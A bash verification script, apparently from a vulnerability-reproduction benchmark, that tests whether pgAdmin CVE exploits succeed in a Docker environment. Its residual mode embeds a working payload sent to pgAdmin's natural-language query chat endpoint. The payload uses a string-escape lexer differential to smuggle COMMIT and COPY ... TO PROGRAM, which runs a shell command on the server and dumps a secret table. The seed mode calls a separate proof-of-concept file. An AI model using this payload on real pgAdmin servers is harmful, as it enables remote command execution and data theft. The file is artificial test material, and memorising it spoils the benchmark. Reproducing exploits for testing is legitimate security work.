#!/usr/bin/env bash
# verify.sh --seed|--residual — 0=效果发生(flag出现) 10=未发生 20=环境失败 30=参数错误
# seed: CVE-2026-12045 NLQ chat → COMMIT;COPY TO PROGRAM (open on 9.15, closed 9.16)
# residual: CVE-2026-17351 sqlparse/PostgreSQL lexer-differential bypass (still open on 9.16)
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

SVC="$VERSION"
PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" 80 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$PORT" ]] || { echo "verify: no published pgAdmin port" >&2; exit 20; }
export PCB_TARGET_PORT="$PORT"
export CASE_DIR
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"

if [[ "$MODE" == "--seed" ]]; then
  OUT="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION")" || { echo "$OUT" >&2; exit 20; }
else
  # CVE-2026-17351 lexer-differential residual. Inline literal only.
  OUT="$("$PY" - "$VERSION" <<'PY'
import json, sys, time, os
sys.path.insert(0, os.environ["CASE_DIR"])
import pgadm_util as u

PAYLOAD = (
    "SELECT '\\';COMMIT;COPY (SELECT secret FROM pcb_secret) TO PROGRAM "
    "'cat > /tmp/pcb_result.txt';SELECT 1 LIMIT 1 --'"
)
version = sys.argv[1]
if not u.wait_ready(version):
    print(json.dumps({"ok": False, "status": 0, "body": "env not ready"}))
    sys.exit(2)
s = u.login(version)
sid = u.ensure_server(version, s)
did = u.get_did(version, s, sid)
u.init_query_tool(version, s, sid, did)
time.sleep(1)
r = s.post(
    u.BASE[version] + "/sqleditor/nlq/chat/424242/stream",
    json={"message": PAYLOAD, "conversation_id": None, "history": []},
    timeout=120, stream=True,
)
r.close()
time.sleep(2)
out = u.read_flag_file(version)
print(json.dumps({"ok": bool(out), "status": r.status_code, "body": out[:200]}))
PY
)" || { echo "$OUT" >&2; exit 20; }
fi

BODY="$("$PY" -c "import json,sys
try:
    d=json.loads(sys.argv[1])
    print(d.get('body') or '')
except Exception:
    print('')" "$OUT")"

echo "${BODY:0:500}"
if [[ "$BODY" == *"env not ready"* || "$BODY" == *"env error:"* ]]; then
  echo "verify: environment failure body=${BODY:0:200}" >&2
  exit 20
fi
if grep -Fq "$RUN_FLAG" <<<"$BODY"; then
  exit 0
fi
exit 10
